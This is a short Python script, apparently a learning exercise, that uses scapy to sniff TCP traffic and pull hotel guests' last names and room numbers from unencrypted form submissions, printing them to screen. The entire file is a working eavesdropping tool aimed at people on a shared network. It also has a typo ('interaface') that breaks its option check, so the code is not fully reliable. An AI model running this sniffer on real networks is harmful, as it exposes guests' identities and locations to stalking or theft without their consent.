"""
Description: A script written in python made to sniff the data of hotel guests.
Author: Aleksa Zatezalo
Date: June 23, 2023
"""

import optparse
from scapy.all import *

def findGuest(pkt):
    """
    Analyizes packet and prints guest information to screen.
    """

    raw = pkt.sprintf('%Raw.load%')
    name = re.findall('(?i)LAST_NAME=(.*)&', raw)
    room = re.findall("(?i)ROOM_NUMBER=(.*)'", raw)

    if name:
        print('[+] Found Hotel Guest ' + str(name[0] + ', Room # ' + str(room[0])))

def main():
    
    parser = optparse.OptionParser('usage %prog ' + '-i interface')
    parser.add_option('-i', dest='interface', type='string', help='specify interface to listen on')
    (options, args) = parser.parse_args()
    if options.interaface == None:
        print(parser.usage)
        exit(0)
    else:
        conf.iface = options.interface
    try:
        print('[*] Starting hotel guest sniffer.')
        sniff(filter='tcp', prn=findGuest, store=0)
    except KeyboardInterrupt:
        exit(0)

if __name__ == '__main__':
    main()